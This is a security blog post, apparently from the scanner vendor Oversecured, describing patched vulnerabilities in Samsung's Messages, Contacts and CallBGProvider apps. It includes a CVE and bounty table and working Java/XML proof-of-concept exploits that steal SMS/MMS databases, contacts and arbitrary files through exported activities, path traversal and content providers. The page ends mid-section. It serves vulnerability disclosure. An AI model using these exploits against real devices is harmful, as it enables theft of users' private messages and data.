<!DOCTYPE html>
<html>
<head>

    <!-- Document Settings -->
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />

    <link rel="apple-touch-icon" sizes="180x180" href="https://blog.oversecured.com/assets/images/apple-touch-icon.png}">
    <link rel="icon" type="image/png" sizes="32x32" href="https://blog.oversecured.com/assets/images/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="https://blog.oversecured.com/assets/images/favicon-16x16.png">
    <link rel="manifest" href="https://blog.oversecured.com/assets/images/site.webmanifes">
    <link rel="mask-icon" href="https://blog.oversecured.com/assets/images/safari-pinned-tab.svg" color="#5bbad5">
    <meta name="msapplication-TileColor" content="#da532c">
    <meta name="theme-color" content="#ffffff">

    <!-- Base Meta -->
    <!-- dynamically fixing the title for tag/author pages -->



    <title>Two weeks of securing Samsung devices&#58; Part 2 | Oversecured Blog</title>
    <meta name="HandheldFriendly" content="True" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link rel="shortcut icon" href="https://blog.oversecured.com/assets/images/favicon.svg" type="image/png" />
    <meta property="og:site_name" content="News, Techniques & Guides" />
    <meta property="og:type" content="website" />
    <meta property="og:title" content="Two weeks of securing Samsung devices&#58; Part 2" />
    <meta property="og:description" content="As mentioned in the [first part](https://blog.oversecured.com/Two-weeks-of-securing-Samsung-devices-Part-1/) of this series,Oversecured spent two weeks finding security bugs in Samsung’s built-in apps." />
    <meta property="og:url" content="https://blog.oversecured.com/Two-weeks-of-securing-Samsung-devices-Part-2/" />
    <meta property="og:image" content="https://blog.oversecured.com/assets/images/twelfth-article-2.png?56790864у5689" />
    <meta property="article:publisher" content="https://www.facebook.com/" />
    <meta name="twitter:card" content="summary_large_image" />
    <meta name="twitter:title" content="Two weeks of securing Samsung devices&#58; Part 2" />
    <meta name="twitter:description" content="As mentioned in the [first part](https://blog.oversecured.com/Two-weeks-of-securing-Samsung-devices-Part-1/) of this series,Oversecured spent two weeks finding security bugs in Samsung’s built-in apps." />
    <meta name="twitter:url" content="https://blog.oversecured.com/Two-weeks-of-securing-Samsung-devices-Part-2/" />
    <meta name="twitter:image:src" content="https://blog.oversecured.com/assets/images/twelfth-article-2.png?56790864у5689" />
    <meta name="twitter:label1" content="Written by" />
    <meta name="twitter:data1" content="News, Techniques & Guides" />
    <meta name="twitter:site" content="@OversecuredInc" />
    <meta name="twitter:creator" content="@OversecuredInc" />
    <meta property="og:image:width" content="2000" />
    <meta property="og:image:height" content="666" />
    <meta data-rh="true" name="robots" content="index,follow,max-image-preview:large">

    <!-- Styles'n'Scripts -->
    <link rel="stylesheet" type="text/css" href="/assets/built/screen.css" />
    <link rel="stylesheet" type="text/css" href="/assets/built/screen.edited.css" />
    <link rel="stylesheet" type="text/css" href="/assets/built/syntax.css" />
    <!-- highlight.js -->
    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/default.min.css">
    <style>
        .hljs { background: none; }

        .markdown-in-single-quotes {
            word-break: break-word;
        }

        .heading-anchor > a {
            font-family: -apple-system, system-ui, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;;
            font-size: 40px !important;
            font-weight: 700;
            color: #000 !important;
        }

        .heading-anchor-small > a {
            font-size: 28px !important;
        }

        .heading-anchor:hover {
            text-decoration: underline;
            cursor: pointer;
        }

        .heading-anchor > a:hover {
            color: black !important;
        }

        .anchorjs-link:hover::after {
            color: black;
        }

        .heading-anchor:target {
            scroll-margin-top: 80px;
        }

        .post-full-content a {
            box-shadow: none;
        }

        .gdpr-notice {
            display: flex;
            align-items: center;
            position: fixed;
            z-index: 1000;
            bottom: 20px;
            right: 20px;
            background: #242424;
            border-radius: 15px;
            padding: 15px 20px;
        }

        .gdpr-notice__text {
            margin: 0;
            max-width: 400px;
            color: white;
            font-style: normal;
            font-weight: normal;
            font-size: 14px;
        }

        .gdpr-notice__btn-accept {
            background: #FFB400;
            border: 2px solid #FFB400;
            box-sizing: border-box;
            border-radius: 8px;
            font-style: normal;
            font-weight: bold;
            font-size: 14px;
            line-height: 17px;
            color: #FFFFFF;
            padding: 10px 40px;
            outline: none;
            transition: 0.3s;
        }

        .gdpr-notice__btn-accept:hover {
            opacity: 0.7;
        }

        .gdpr-notice__btn-accept:active {
            opacity: 1;
        }

        .gdpr-notice__link {
            color: white;
            text-decoration: underline;
        }

        .post-full-content > div > ul > li > a {
            color: #30c4fc;
        }

        .post-full-content > div > ul > li > a:hover {
            color: #3289b3;
        }

        .post-full-content > div > p > a {
            color: #30c4fc;
        }

        .post-full-content > div > p > a:hover {
            color: #3289b3;
        }

        .table {
            white-space: normal !important;
        }

        @media (max-width: 620px) {
            .gdpr-notice {
                display: flex;
                align-items: center;
                flex-direction: column;
                position: fixed;
                z-index: 1000;
                bottom: 0;
                right: 0;
                background: #242424;
                border-radius: 0;
                padding: 15px 20px;
                width: 100%;
            }

            .gdpr-notice__text {
                margin-bottom: 15px;
            }

            .heading-anchor > a {
                font-size: 25px !important;
                padding-left: 20px !important;
                display: block;
            }

            .anchor-item {
                padding: 0 !important;
                margin-left: -20px !important;
            }
        }

    </style>

    <!--[if IE]>
        <style>
            p, ol, ul{
                width: 100%;
            }
            blockquote{
                width: 100%;
            }
        </style>
    <![endif]-->

    <!-- This tag outputs SEO meta+structured data and other important settings -->
<!--    <meta name="description" content="As mentioned in the [first part](https://blog.oversecured.com/Two-weeks-of-securing-Samsung-devices-Part-1/) of this series,Oversecured spent two weeks finding security bugs in Samsung’s built-in apps." />
    <link rel="canonical" href="/Two-weeks-of-securing-Samsung-devices-Part-2/" />
    <meta name="referrer" content="no-referrer-when-downgrade" />

    

    <script type="application/ld+json">
{
    "@context": "https://schema.org",
    "@type": "Website",
    "publisher": {
        "@type": "Organization",
        "name": "News, Techniques & Guides",
        "logo": "/assets/images/blog-icon.png"
    },
    "url": "Jekyll::Drops::SiteDrop/Two-weeks-of-securing-Samsung-devices-Part-2/",
    "image": {
        "@type": "ImageObject",
        "url": "/assets/images/twelfth-article-2.png",
        "width": 2000,
        "height": 666
    },
    "mainEntityOfPage": {
        "@type": "WebPage",
        "@id": "/Two-weeks-of-securing-Samsung-devices-Part-2/"
    },
    "description": "As mentioned in the first part of this series, Oversecured spent two weeks finding security bugs in Samsung’s built-in apps. In this part, we will go over bugs that could have allowed an attacker to: read &amp; write arbitrary files in the name of the system read arbitrary telephone-related files"
}
    </script>

    <link rel="alternate" type="application/rss+xml" title="Two weeks of securing Samsung devices&#58; Part 2" href="/feed.xml" />
-->

</head>
<body class="post-template">
<!--    <a id="notice" style="font-size: 16px; font-weight: 700" class="link-to-oversecured" target="_blank" href="https://oversecured.com/" rel="noopener">Visit Oversecured.com and get 3 free scans</a>-->
    <svg id="cross" class="link-to-oversecured__cross" width="11" height="11" viewBox="0 0 11 11" fill="none" xmlns="http://www.w3.org/2000/svg">
        <path fill-rule="evenodd" clip-rule="evenodd" d="M9.70711 9.70735C9.31658 10.0979 8.68342 10.0979 8.29289 9.70735L0.707107 2.12156C0.316582 1.73104 0.316582 1.09788 0.707107 0.707351C1.09763 0.316827 1.7308 0.316826 2.12132 0.70735L9.70711 8.29314C10.0976 8.68366 10.0976 9.31683 9.70711 9.70735Z" fill="white"/>
        <path fill-rule="evenodd" clip-rule="evenodd" d="M9.70711 0.7072C10.0976 1.09772 10.0976 1.73089 9.70711 2.12141L2.12132 9.7072C1.7308 10.0977 1.09763 10.0977 0.707107 9.7072C0.316582 9.31668 0.316582 8.68351 0.707106 8.29299L8.29289 0.7072C8.68342 0.316676 9.31658 0.316676 9.70711 0.7072Z" fill="white"/>
    </svg>
    <div class="site-wrapper">
        <!-- All the main content gets inserted here, index.hbs, post.hbs, etc -->
        <!-- default -->

assign cover = page.cover


<!-- The tag above means: insert everything in this file
into the {body} of the default.hbs template -->
<header class="site-header outer">
    <div class="inner">
        <nav class="site-nav">
    <div class="site-nav-left">
        
            
                <a class="site-nav-logo" href="/"><img src="/assets/images/blog-icon.png" alt="News, Techniques & Guides" /></a>
            
        
        
    </div>
    <div class="site-nav-right">
        <div class="social-links">
            
<!--            -->
<!--                <a class="social-link social-link-tw" href="https://twitter.com/OversecuredInc" target="_blank" rel="noopener"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><path d="M30.063 7.313c-.813 1.125-1.75 2.125-2.875 2.938v.75c0 1.563-.188 3.125-.688 4.625a15.088 15.088 0 0 1-2.063 4.438c-.875 1.438-2 2.688-3.25 3.813a15.015 15.015 0 0 1-4.625 2.563c-1.813.688-3.75 1-5.75 1-3.25 0-6.188-.875-8.875-2.625.438.063.875.125 1.375.125 2.688 0 5.063-.875 7.188-2.5-1.25 0-2.375-.375-3.375-1.125s-1.688-1.688-2.063-2.875c.438.063.813.125 1.125.125.5 0 1-.063 1.5-.25-1.313-.25-2.438-.938-3.313-1.938a5.673 5.673 0 0 1-1.313-3.688v-.063c.813.438 1.688.688 2.625.688a5.228 5.228 0 0 1-1.875-2c-.5-.875-.688-1.813-.688-2.75 0-1.063.25-2.063.75-2.938 1.438 1.75 3.188 3.188 5.25 4.25s4.313 1.688 6.688 1.813a5.579 5.579 0 0 1 1.5-5.438c1.125-1.125 2.5-1.688 4.125-1.688s3.063.625 4.188 1.813a11.48 11.48 0 0 0 3.688-1.375c-.438 1.375-1.313 2.438-2.563 3.188 1.125-.125 2.188-.438 3.313-.875z"/></svg>
</a>-->
<!--            -->
<!--        </div>-->
<!--        -->
<!--    </div>-->
</nav>

    </div>
</header>

<!-- Everything inside the #post tags pulls data from the post -->
<!-- #post -->

<main id="site-main" class="site-main outer" role="main">
    <div class="inner">

        <article class="post-full post tag-getting-started ">
            <header class="post-full-header">
                <section class="post-full-meta">
                    <time class="post-full-meta-date" datetime="16 August 2021">16 August 2021</time>
                    
                </section>
                <h1 class="post-full-title">Two weeks of securing Samsung devices&#58; Part 2</h1>
            </header>

            
            <div class="post-full-image" style="background-image: url(/assets/images/twelfth-article-2.png)">
            </div>
            

            <section class="post-full-content">
                <div class="kg-card-markdown">
                    <p>As mentioned in the <a href="https://blog.oversecured.com/Two-weeks-of-securing-Samsung-devices-Part-1/">first part</a> of this series, Oversecured spent two weeks finding security bugs in Samsung’s built-in apps. In this part, we will go over bugs that could have allowed an attacker to:</p>
<ul>
  <li>read &amp; write arbitrary files in the name of the system</li>
  <li>read arbitrary telephone-related files from the Android user’s phone, such as their call history and SMS/MMS</li>
  <li>read &amp; modify the user’s contact data</li>
  <li>steal the user’s messages from the Samsung Messages app</li>
</ul>

<p>If you’re a developer or an app owner, you can integrate Oversecured into your CI/CD to proactively secure your apps against these vulnerabilities. The CI/CD process can also be fully automated using plugins. Our solutions will continuously monitor your apps and alert you if any new vulnerabilities are detected.</p>

<p>Start securing your apps by beginning a trial from <a href="https://oversecured.com/docs/quick-start/">Quick Start</a>, or you can <a href="https://oversecured.com/contact-us">contact us</a> to learn more.</p>

<p>If you’re a security researcher, you can automate the bug detection process by using Oversecured’s mobile app scanner to scan for these bugs. All you have to do is <a href="https://oversecured.com/sign-up">sign up</a> and upload your app’s files. Our scanner will take care of the rest.</p>

<p>Vulnerability table:</p>

<table class="table">
  <thead>
    <tr>
      <th><strong>CVE</strong></th>
      <th><strong>SVE</strong></th>
      <th><strong>AFFECTED APP</strong></th>
      <th><strong>DESCRIPTION</strong></th>
      <th><strong>REWARD AMOUNT</strong></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>CVE-2021-25426</td>
      <td>SVE-2021-20903</td>
      <td>Samsung Messages (com.samsung.android.messaging)</td>
      <td>Theft of arbitrary files</td>
      <td>$1050</td>
    </tr>
    <tr>
      <td>CVE-2021-25410</td>
      <td>SVE-2021-20702</td>
      <td>CallBGProvider (com.samsung.android.callbgprovider)</td>
      <td>Read arbitrary files as system (UID 1001) user</td>
      <td>$2180</td>
    </tr>
    <tr>
      <td>CVE-2021-25413</td>
      <td>SVE-2021-20877</td>
      <td>Samsung Contacts (com.samsung.android.app.contacts)</td>
      <td>Gaining access to arbitrary* content providers</td>
      <td>$2250</td>
    </tr>
    <tr>
      <td>CVE-2021-25414</td>
      <td>SVE-2021-20879</td>
      <td>Samsung Contacts (com.samsung.android.app.contacts)</td>
      <td>Theft/overwrite of arbitrary files</td>
      <td>$2250</td>
    </tr>
    <tr>
      <td>CVE-2021-25440</td>
      <td>SVE-2021-20722</td>
      <td>FactoryCameraFB (com.sec.factory.camera)</td>
      <td>Read/write arbitrary files as system (UID 1000) user</td>
      <td>$10310</td>
    </tr>
  </tbody>
</table>

<p class="heading-anchor"><a href="#file-theft-in-samsung-messages">File theft in Samsung Messages</a></p>
<p>After scanning the Samsung Messages app, we received an alert about the possibility for theft of arbitrary files:
<img class="post-template__vulnearbility-image" src="/assets/images/samsung_messages_provide.png" alt="vulnerability" /></p>

<p class="markdown-in-single-quotes">We could pass an attacker-controlled URI through the <code class="highlighter-rouge">SmsViewerData.f25878w</code> field and the app would then save it to the <code class="highlighter-rouge">/sdcard/Android/data/com.samsung.android.messaging/cache/</code> folder when the user pressed the Share message button.</p>

<p>To access arbitrary files, we used an unsafe content provider:
<img class="post-template__vulnearbility-image" src="/assets/images/samsung_messages_theft.png" alt="vulnerability" /></p>

<p>Proof of Concept:</p>
<div class="language-java code-markdown highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">protected</span> <span class="kt">void</span> <span class="nf">onCreate</span><span class="o">(</span><span class="n">Bundle</span> <span class="n">savedInstanceState</span><span class="o">)</span> <span class="o">{</span>
    <span class="kd">super</span><span class="o">.</span><span class="na">onCreate</span><span class="o">(</span><span class="n">savedInstanceState</span><span class="o">);</span>

    <span class="n">String</span> <span class="n">fileName</span> <span class="o">=</span> <span class="s">"evil.mp4"</span><span class="o">;</span>

    <span class="n">SmsViewerData</span> <span class="n">data</span> <span class="o">=</span> <span class="k">new</span> <span class="n">SmsViewerData</span><span class="o">();</span>
    <span class="n">data</span><span class="o">.</span><span class="na">f25878w</span> <span class="o">=</span> <span class="n">Uri</span><span class="o">.</span><span class="na">parse</span><span class="o">(</span><span class="s">"content://com.samsung.android.messaging.ui.file/root-path/data/data/com.samsung.android.messaging/databases/message_content.db"</span><span class="o">);</span>
    <span class="n">data</span><span class="o">.</span><span class="na">f25879x</span> <span class="o">=</span> <span class="n">fileName</span><span class="o">;</span>
    <span class="n">data</span><span class="o">.</span><span class="na">f25871p</span> <span class="o">=</span> <span class="mi">1</span><span class="o">;</span>
    <span class="n">data</span><span class="o">.</span><span class="na">f25864i</span> <span class="o">=</span> <span class="mi">12</span><span class="o">;</span>
    <span class="n">data</span><span class="o">.</span><span class="na">f25877v</span> <span class="o">=</span> <span class="s">"video/mp4"</span><span class="o">;</span>

    <span class="n">Intent</span> <span class="n">i</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Intent</span><span class="o">();</span>
    <span class="n">i</span><span class="o">.</span><span class="na">setClassName</span><span class="o">(</span><span class="s">"com.samsung.android.messaging"</span><span class="o">,</span> <span class="s">"com.samsung.android.messaging.ui.view.viewer.SmsViewerActivity"</span><span class="o">);</span>
    <span class="n">i</span><span class="o">.</span><span class="na">putExtra</span><span class="o">(</span><span class="s">"xms_viewer_data"</span><span class="o">,</span> <span class="n">data</span><span class="o">);</span>
    <span class="n">startActivity</span><span class="o">(</span><span class="n">i</span><span class="o">);</span>

    <span class="k">new</span> <span class="nf">Handler</span><span class="o">().</span><span class="na">postDelayed</span><span class="o">(()</span> <span class="o">-&gt;</span> <span class="o">{</span>
        <span class="n">String</span> <span class="n">path</span> <span class="o">=</span> <span class="n">getExternalCacheDir</span><span class="o">().</span><span class="na">getAbsolutePath</span><span class="o">().</span><span class="na">replace</span><span class="o">(</span><span class="n">getPackageName</span><span class="o">(),</span> <span class="s">"com.samsung.android.messaging"</span><span class="o">);</span>
        <span class="n">dumpFile</span><span class="o">(</span><span class="k">new</span> <span class="n">File</span><span class="o">(</span><span class="n">path</span><span class="o">,</span> <span class="n">fileName</span><span class="o">).</span><span class="na">getAbsolutePath</span><span class="o">());</span>
    <span class="o">},</span> <span class="mi">15000</span><span class="o">);</span>
<span class="o">}</span>

<span class="kd">private</span> <span class="kt">void</span> <span class="nf">dumpFile</span><span class="o">(</span><span class="n">String</span> <span class="n">path</span><span class="o">)</span> <span class="o">{</span>
    <span class="n">ContentValues</span> <span class="n">values</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ContentValues</span><span class="o">();</span>
    <span class="n">values</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"_data"</span><span class="o">,</span> <span class="n">path</span><span class="o">);</span>
    <span class="n">Uri</span> <span class="n">uri</span> <span class="o">=</span> <span class="n">getContentResolver</span><span class="o">().</span><span class="na">insert</span><span class="o">(</span><span class="n">MediaStore</span><span class="o">.</span><span class="na">Files</span><span class="o">.</span><span class="na">getContentUri</span><span class="o">(</span><span class="s">"external"</span><span class="o">),</span> <span class="n">values</span><span class="o">);</span>

    <span class="k">try</span> <span class="o">{</span>
        <span class="n">Log</span><span class="o">.</span><span class="na">d</span><span class="o">(</span><span class="s">"evil"</span><span class="o">,</span> <span class="n">IOUtils</span><span class="o">.</span><span class="na">toString</span><span class="o">(</span><span class="n">getContentResolver</span><span class="o">().</span><span class="na">openInputStream</span><span class="o">(</span><span class="n">uri</span><span class="o">)));</span>
    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Throwable</span> <span class="n">th</span><span class="o">)</span> <span class="o">{</span>
        <span class="n">Log</span><span class="o">.</span><span class="na">d</span><span class="o">(</span><span class="s">"evil"</span><span class="o">,</span> <span class="s">"Error"</span><span class="o">,</span> <span class="n">th</span><span class="o">);</span>
    <span class="o">}</span>
<span class="o">}</span>
</code></pre></div></div>

<p>Since the latest Android versions do not allow accessing external cache files, we made use of the <code class="highlighter-rouge">dumpFile</code> method to bypass this protection in our PoC.</p>

<p class="heading-anchor"><a href="#file-theft-from-uid-1001-in-callBGProvider">File theft from UID 1001 in CallBGProvider</a></p>
<p class="markdown-in-single-quotes">The <code class="highlighter-rouge">CallBGProvider</code> provider is declared with the permission <code class="highlighter-rouge">com.samsung.android.callbgprovider.PERMISSION</code>, which is not properly protected:</p>
<div class="language-xml code-markdown highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;permission</span> <span class="na">android:name=</span><span class="s">"com.samsung.android.callbgprovider.PERMISSION"</span><span class="nt">/&gt;</span>
</code></pre></div></div>

<p>If <code class="highlighter-rouge">android:protectionLevel</code> is not specifically set by the developer, it gets defined as <code class="highlighter-rouge">normal</code> by default – which would allow any third-party apps to access the resource.</p>

<p><img class="post-template__vulnearbility-image" src="/assets/images/samsung_callbgprovider_provider.png" alt="vulnerability" /></p>

<p>The above provider is also vulnerable to path traversal due to the use of <code class="highlighter-rouge">Uri.getLastPathSegment()</code>, which automatically decodes the value.</p>

<p>Proof of Concept for reading the database containing SMS/MMS messages.</p>

<p>File <code class="highlighter-rouge">AndroidManifest.xml</code>:</p>
<div class="language-xml code-markdown highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;uses-permission</span> <span class="na">android:name=</span><span class="s">"com.samsung.android.callbgprovider.PERMISSION"</span><span class="nt">/&gt;</span>
</code></pre></div></div>

<p>File <code class="highlighter-rouge">MainActivity.java</code>:</p>
<div class="language-java code-markdown highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">try</span> <span class="o">{</span>
    <span class="n">getContentResolver</span><span class="o">().</span><span class="na">call</span><span class="o">(</span><span class="n">Uri</span><span class="o">.</span><span class="na">parse</span><span class="o">(</span><span class="s">"content://com.samsung.android.callbgprovider.media"</span><span class="o">),</span> <span class="s">"get_gradation_contents"</span><span class="o">,</span> <span class="s">""</span><span class="o">,</span> <span class="k">new</span> <span class="n">Bundle</span><span class="o">());</span>

    <span class="n">File</span> <span class="n">dbPath</span> <span class="o">=</span> <span class="k">new</span> <span class="n">File</span><span class="o">(</span><span class="n">getPackageManager</span><span class="o">().</span><span class="na">getApplicationInfo</span><span class="o">(</span><span class="s">"com.android.providers.telephony"</span><span class="o">,</span> <span class="mi">0</span><span class="o">).</span><span class="na">dataDir</span><span class="o">,</span> <span class="s">"databases/mmssms.db"</span><span class="o">);</span>
    <span class="n">Uri</span> <span class="n">uri</span> <span class="o">=</span> <span class="n">Uri</span><span class="o">.</span><span class="na">parse</span><span class="o">(</span><span class="s">"content://com.samsung.android.callbgprovider.media/videos/..%2F..%2F..%2F..%2F..%2F.."</span> <span class="o">+</span> <span class="n">Uri</span><span class="o">.</span><span class="na">encode</span><span class="o">(</span><span class="n">dbPath</span><span class="o">.</span><span class="na">getAbsolutePath</span><span class="o">()));</span>
    <span class="n">Log</span><span class="o">.</span><span class="na">d</span><span class="o">(</span><span class="s">"evil"</span><span class="o">,</span> <span class="n">IOUtils</span><span class="o">.</span><span class="na">toString</span><span class="o">(</span><span class="n">getContentResolver</span><span class="o">().</span><span class="na">openInputStream</span><span class="o">(</span><span class="n">uri</span><span class="o">)));</span>
<span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Throwable</span> <span class="n">th</span><span class="o">)</span> <span class="o">{</span>
    <span class="k">throw</span> <span class="k">new</span> <span class="nf">RuntimeException</span><span class="o">(</span><span class="n">th</span><span class="o">);</span>
<span class="o">}</span>
</code></pre></div></div>

<p>The code in <code class="highlighter-rouge">CallBGProvider.call(...)</code> helps create directories like <code class="highlighter-rouge">videos</code>, <code class="highlighter-rouge">images</code>, etc., which don’t exist by default. Therefore, if <code class="highlighter-rouge">getContentResolver().call(...)</code> wasn’t present in our PoC, then calling <code class="highlighter-rouge">ParcelFileDescriptor.open(...)</code> would have thrown a <code class="highlighter-rouge">FileNotFoundException</code> error.</p>

<p class="heading-anchor"><a href="#file-theft-and-writing-to-samsung-contacts">File theft and writing to Samsung Contacts</a></p>
<p class="markdown-in-single-quotes">The activity <code class="highlighter-rouge">com.samsung.android.contacts.editor.SetProfilePhotoActivity</code> in the Samsung Contacts app is exported. Moreover, it also accepts two attacker-controlled URIs:</p>
<ol>
  <li><code class="highlighter-rouge">shared_photo_uri</code> for getting content</li>
  <li><code class="highlighter-rouge">temp_photo_uri</code> for saving content</li>
</ol>

<p><img class="post-template__vulnearbility-image" src="/assets/images/samsung_contacts_theft.png" alt="vulnerability" /></p>

<p class="markdown-in-single-quotes">To access arbitrary files, we used the content provider <code class="highlighter-rouge">com.samsung.android.scloud.oem.lib.ClientProvider</code> with the authority <code class="highlighter-rouge">com.samsung.contacts.backup</code>. This, in turn, provided us with read/write access to arbitrary files specified in the path section of the URI.</p>

<p>Proof of Concept for file theft.</p>

<p>File <code class="highlighter-rouge">AndroidManifest.xml</code>:</p>
<div class="language-xml code-markdown highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="nt">&lt;provider</span> <span class="na">android:name=</span><span class="s">".MyContentProvider"</span> <span class="na">android:authorities=</span><span class="s">"oversecured.evil"</span> <span class="na">android:exported=</span><span class="s">"true"</span> <span class="nt">/&gt;</span>
</code></pre></div></div>

<p>File <code class="highlighter-rouge">MainActivity.java</code>:</p>
<div class="language-java code-markdown highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">String</span> <span class="n">path</span> <span class="o">=</span> <span class="k">new</span> <span class="n">File</span><span class="o">(</span><span class="n">getApplicationInfo</span><span class="o">().</span><span class="na">dataDir</span><span class="o">,</span> <span class="s">"dump"</span><span class="o">).</span><span class="na">getAbsolutePath</span><span class="o">();</span>
<span class="n">String</span> <span class="n">theft</span> <span class="o">=</span> <span class="s">"/data/data/com.samsung.android.app.contacts/shared_prefs/SamsungAnalyticsPrefs.xml"</span><span class="o">;</span>

<span class="n">Intent</span> <span class="n">i</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Intent</span><span class="o">(</span><span class="n">Intent</span><span class="o">.</span><span class="na">ACTION_SEND</span><span class="o">);</span>
<span class="n">i</span><span class="o">.</span><span class="na">setClassName</span><span class="o">(</span><span class="s">"com.samsung.android.app.contacts"</span><span class="o">,</span> <span class="s">"com.samsung.android.contacts.editor.SetProfilePhotoActivity"</span><span class="o">);</span>
<span class="n">i</span><span class="o">.</span><span class="na">putExtra</span><span class="o">(</span><span class="s">"shared_photo_uri"</span><span class="o">,</span> <span class="s">"content://com.samsung.contacts.backup"</span> <span class="o">+</span> <span class="n">theft</span><span class="o">);</span> <span class="c1">// input</span>
<span class="n">i</span><span class="o">.</span><span class="na">putExtra</span><span class="o">(</span><span class="s">"temp_photo_uri"</span><span class="o">,</span> <span class="s">"content://oversecured.evil/?path="</span> <span class="o">+</span> <span class="n">path</span><span class="o">);</span> <span class="c1">// output</span>
<span class="n">i</span><span class="o">.</span><span class="na">putExtra</span><span class="o">(</span><span class="s">"cropped_photo_uri"</span><span class="o">,</span> <span class="s">""</span><span class="o">);</span>
<span class="n">i</span><span class="o">.</span><span class="na">putExtra</span><span class="o">(</span><span class="s">"mimeType"</span><span class="o">,</span> <span class="s">"x"</span><span class="o">);</span>
<span class="n">startActivity</span><span class="o">(</span><span class="n">i</span><span class="o">);</span>

<span class="k">new</span> <span class="nf">Handler</span><span class="o">().</span><span class="na">postDelayed</span><span class="o">(()</span> <span class="o">-&gt;</span> <span class="o">{</span>
    <span class="k">try</span> <span class="o">{</span>
        <span class="n">Log</span><span class="o">.</span><span class="na">d</span><span class="o">(</span><span class="s">"evil"</span><span class="o">,</span> <span class="n">IOUtils</span><span class="o">.</span><span class="na">toString</span><span class="o">(</span><span class="k">new</span> <span class="n">FileInputStream</span><span class="o">(</span><span class="n">path</span><span class="o">)));</span>
    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Throwable</span> <span class="n">th</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">throw</span> <span class="k">new</span> <span class="nf">RuntimeException</span><span class="o">(</span><span class="n">th</span><span class="o">);</span>
    <span class="o">}</span>
<span class="o">},</span> <span class="mi">1000</span><span class="o">);</span>
</code></pre></div></div>

<p>File <code class="highlighter-rouge">MyContentProvider.java</code>:</p>
<div class="language-java code-markdown highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="n">ParcelFileDescriptor</span> <span class="nf">openFile</span><span class="o">(</span><span class="n">Uri</span> <span class="n">uri</span><span class="o">,</span> <span class="n">String</span> <span class="n">mode</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">FileNotFoundException</span> <span class="o">{</span>
    <span class="k">try</span> <span class="o">{</span>
        <span class="k">return</span> <span class="n">ParcelFileDescriptor</span><span class="o">.</span><span class="na">open</span><span class="o">(</span><span class="k">new</span> <span class="n">File</span><span class="o">(</span><span class="n">uri</span><span class="o">.</span><span class="na">getQueryParameter</span><span class="o">(</span><span class="s">"path"</span><span class="o">)),</span> <span class="n">ParcelFileDescriptor</span><span class="o">.</span><span class="na">MODE_WRITE_ONLY</span> <span class="o">|</span> <span class="n">ParcelFileDescriptor</span><span class="o">.</span><span class="na">MODE_CREATE</span><span class="o">);</span>
    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Throwable</span> <span class="n">th</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
    <span class="o">}</span>
<span class="o">}</span>
</code></pre></div></div>

<p class="heading-anchor"><a href="#accessing-arbitrary-content-providers-in-samsung-contacts">Accessing arbitrary Content Providers in Samsung Contacts</a></p>
<p class="markdown-in-single-quotes">This attack uses the same activity (<code class="highlighter-rouge">com.samsung.android.contacts.editor.SetProfilePhotoActivity</code>) as the previous vulnerability.</p>

<p>The flow of this attack looks like this:</p>
<ol>
  <li>An invalid URI is specified by an attacker in <code class="highlighter-rouge">temp_photo_uri</code></li>
  <li>The app automatically launches an implicit intent with the <code class="highlighter-rouge">Intent.FLAG_GRANT_READ_URI_PERMISSION</code> &amp; <code class="highlighter-rouge">Intent.FLAG_GRANT_WRITE_URI_PERMISSION</code> flags</li>
  <li>The attacker-controlled value in <code class="highlighter-rouge">cropped_photo_uri</code> is passed to the Intent’s ClipData.</li>
</ol>

<p><img class="post-template__vulnearbility-image" src="/assets/images/samsung_contacts_content_providers_access.png" alt="vulnerability" /></p>

<p>When an attacker intercepts the implicit intent, they will automatically have read/write access to the URI.</p>

<p>Proof of Concept for reading a complete contact list.</p>

<p>File <code class="highlighter-rouge">AndroidManifest.xml</code></p>
<div class="language-xml code-markdown highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;activity</span> <span class="na">android:name=</span><span class="s">".PickerActivity"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;intent-filter</span> <span class="na">android:autoVerify=</span><span class="s">"true"</span> <span class="na">android:priority=</span><span class="s">"999999999"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;action</span> <span class="na">android:name=</span><span class="s">"com.android.camera.action.CROP"</span> <span class="nt">/&gt;</span>
        <span class="nt">&lt;category</span> <span class="na">android:name=</span><span class="s">"android.intent.category.DEFAULT"</span> <span class="nt">/&gt;</span>
        <span class="nt">&lt;data</span> <span class="na">android:mimeType=</span><span class="s">"*/*"</span> <span class="nt">/&gt;</span>
        <span class="nt">&lt;data</span> <span class="na">android:mimeType=</span><span class="s">"image/*"</span> <span class="nt">/&gt;</span>
        <span class="nt">&lt;data</span> <span class="na">android:mimeType=</span><span class="s">"test/1337"</span> <span class="nt">/&gt;</span>
    <span class="nt">&lt;/intent-filter&gt;</span>
<span class="nt">&lt;/activity&gt;</span>
</code></pre></div></div>

<p>File <code class="highlighter-rouge">MainActivity.java</code>:</p>
